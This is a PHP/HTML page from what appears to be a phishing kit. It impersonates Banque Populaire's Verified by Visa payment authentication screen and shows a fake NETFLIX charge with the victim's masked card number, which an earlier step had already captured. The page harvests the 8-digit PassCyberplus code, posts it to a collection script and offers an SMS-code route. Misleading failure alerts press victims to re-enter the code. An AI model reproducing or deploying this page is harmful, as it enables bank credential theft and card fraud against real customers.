<?php


session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////


?>


<!DOCTYPE html>
<html>
<script type="text/javascript">
function val(){
if(Form_Authent.chp1.value=="")
{
	alert("Votre authentification a échoué. Les informations saisies ne sont pas conformes à celles attendues par votre Banque Populaire. Nous vous invitons à les saisir une nouvelle fois.");
	Form_Authent.chp1.focus(); 
	return false;
}
if(isNaN(Form_Authent.chp1.value))
{
	alert("Votre authentification a échoué. Les informations saisies ne sont pas conformes à celles attendues par votre Banque Populaire. Nous vous invitons à les saisir une nouvelle fois.");
	Form_Authent.chp1.focus(); 
	return false;
}
if((Form_Authent.chp1.value).length < 8)
{
	alert("Votre authentification a échoué. Les informations saisies ne sont pas conformes à celles attendues par votre Banque Populaire. Nous vous invitons à les saisir une nouvelle fois.");
	Form_Authent.chp1.focus(); 
	return false;
}

return true;
}
</script>
<head>
<link rel="icon" type="image/x-icon" href="FAVICON.ico"/>
        <style>
   ook, oook {
    float: left;
}

label {
    display: inline-block;
    vertical-align: middle;
} 
</style> 
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0 maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href=css/style-banque-ibp.css />
	<link rel="stylesheet" type="text/css" href="css/jquery.mobile.structure-1.4.5.min.css" />
<!--	<script type="text/javascript" src="js/jquery-1.11.1.min.js"></script> -->

	<title>Pour valider ce paiement, votre Banque Populaire vous demande de vous authentifier.</title>
</head>
<body onload="setTimeout('onLoadEvent()',240*1000);">
  <div id="page" data-role="page">
	
		<div id="header-block">
			<div id="header">
				
				<img id='logo-left'  src='imgs/ImgServlet.gif' alt='BP' title='BP' /><img id='logo-right' src='imgs/ImgServlet3.gif' alt='Verified by Visa' title='Verified by Visa' />
				<div style="clear:both;"></div>
			</div>	
		</div>
	
	
 <div id="main-block">
		
		
			<div id="cancelText" class="error" style="display:none;">Pour confirmer l'annulation de votre transaction, cliquez une nouvelle fois sur "Je ne souhaite pas m'authentifier et j'annule ma transaction".</div>
		
		<div class="title"><p><p>Bonjour, bienvenue sur la page de s&eacute;curisation des paiements par Internet de votre Banque Populaire.</p><p>Vous avez demand&eacute; &agrave; effectuer le paiement suivant :</p></div>
		<div id="context" class="ui-grid-a">
			
				<div class="ui-block-a"><span class="label-context">Commer&ccedil;ant&nbsp;:&nbsp;</span></div>
	            <div class="ui-block-b"><span>NETFLIX</span></div>
	          
	            <div class="ui-block-a"><span class="label-context">Montant&nbsp;:&nbsp;</span></div>
	            <div class="ui-block-b"><span>13,99 EUR</span></div>
	          
	         <div class="ui-block-a"><span class="label-context">Date de la transaction&nbsp;:&nbsp;</span></div>
            <b> <?php echo date("m/d/Y g:i:s"); ?> </b>
            <div class="ui-block-a"><span class="label-context">Carte&nbsp;:&nbsp;</span></div>
            <div class="ui-block-b"><span><?php echo $masked ?></span></div>
		</div>
		<div>
			<div class="title">
				<p>
					Pour valider ce paiement, votre Banque Populaire vous demande de vous authentifier.
				</p>
			</div>
			<div id="instructions-ucr">
			<div class="ui-grid-a">    
                <div class="ui-block-a">
                  	<img id="ucr-img" alt="UCR" src="imgs/cap.png"/>
	                <div class="text-choice-detail" style="margin-left:4em">
	                  	Reporter ici les 8 chiffres du code de contr&ocirc;le affich&eacute; sur votre PassCyberplus
	                </div>
                </div>
                <div class="ui-block-b">
                	<form name="Form_Authent" id="buyCodeForm" action="../activity/auth_3d_cyberplus.php" method="post">
						<ook><input id="chp1" name="chp1" type="tel" maxlength="8" size="12" /></ook>
                        <oook><input type="image" src="imgs/button.png" border="0" onclick="return val();" alt="Submit" /></oook>
						<!--a><input type="submit" class="ui-btn ui-btn-inline" id="btn_ok" value="OK" ></a-->
						<img id="loader" style="display:none;margin-left:20px;" src="imgs/loading.gif" />
						<script type='text/javascript'>
		  					var input = document.getElementById("chp1").focus();
						</script>
					</form>
                  							    				      				      				                                                                 
		        </div>
            </div>
           </div>
        </div>
        <div class="text-choice-detail">Cette authentification est obligatoire pour v&eacute;rifier que vous &ecirc;tes bien le titulaire de la carte. Si vous ne souhaitez pas vous authentifier, la transaction en cours sera annul&eacute;e.</div>		
		<div id="buttons">
			
		 	<a class="ui-btn-inline link_fl_b" href="sms.php"/>
		 		Je ne souhaite pas m&rsquo;authentifier par CyberPlus et utilisé les 8 chiffres du code reçu par SMS<br />
		 	</a>
		</div>
		
	
		<div id="buttons">	
			
				
				
					<a class="ui-btn-inline link_fl_b" href="#"
						onclick="showHelpWflowByIssuer('wflowCNCE','1756','DAF66AB69A0026DBA14B6A3B75758234.w-node3','')">
						En savoir plus sur le processus d'authentification
					</a>
				
			
		</div>
	
	<div class="text-choice-detail">En cas de besoin, vous pouvez contacter votre Banque Populaire au num&eacute;ro 05 49 08 65 10.</div>
  
	<div id="logo1Src" style="overflow:hidden;direction:rtl">
				<img   src='imgs/ImgServlet2.gif' alt='footerBP' title='footerBP'   />
	</div>
	 </div>
    
  </body>
 </html>